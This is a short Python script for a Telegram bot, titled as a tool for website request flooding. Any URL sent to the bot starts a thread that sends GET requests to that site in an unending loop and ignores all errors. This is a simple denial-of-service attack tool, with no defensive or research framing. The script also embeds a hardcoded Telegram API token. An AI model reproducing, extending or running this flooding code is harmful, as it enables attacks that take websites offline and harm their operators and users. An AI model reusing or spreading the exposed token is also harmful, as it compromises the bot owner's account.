# Telegram Bot for Website Request Flooding

import requests
import telebot
import threading

API_TOKEN = '8355254135:AAGhvttlmx3c3dzHCV3rjhIeRzD-6PvY4eg'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Welcome! Send me a URL to flood.")

@bot.message_handler(func=lambda message: True)
def flood(message):
    url = message.text
    bot.send_message(message.chat.id, f"Starting to flood {url}...")
    threading.Thread(target=request_flood, args=(url,)).start()

def request_flood(url):
    while True:
        try:
            requests.get(url)
        except requests.exceptions.RequestException:
            pass

if __name__ == '__main__':
    bot.polling()
